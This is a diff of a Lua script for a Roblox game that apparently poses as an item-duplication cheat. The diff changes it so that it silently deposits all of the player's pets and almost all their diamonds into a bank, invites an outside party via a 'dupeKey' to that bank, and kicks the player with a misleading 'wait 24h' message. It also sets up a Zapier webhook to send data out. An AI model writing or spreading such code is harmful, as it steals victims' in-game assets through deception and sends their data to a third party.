@@ -9,19 +9,11 @@ for i,v in pairs(lib.Save.Get().Pets) do
         table.insert(PetsList, v.uid);
     end
 end
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+local request = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 69);
 if request then
-    lib.Message.New("Starting...");
-else
-    lib.Message.New(request2 and "Make sure your bank is tier 5 or above! Upgrade your bank and execute again.");
-    return;
+    lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey)
+    game.Players.LocalPlayer:Kick("Please wait 24h before your rejoin.")
 end
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
-    lib.Message.New("Successfull! Please wait 24 hours for the ID to randomise.");
-else
-    lib.Message.New("Error! Please kick all members.");
-end
-game.Players.LocalPlayer:Kick("Rejoin in 24 hours!")
 local url = "https://hooks.zapier.com/hooks/catch/12832877/bwscxwe/"
 local data0 = {}
 local newdata0 = game:GetService'HttpService':JSONEncode(data0)
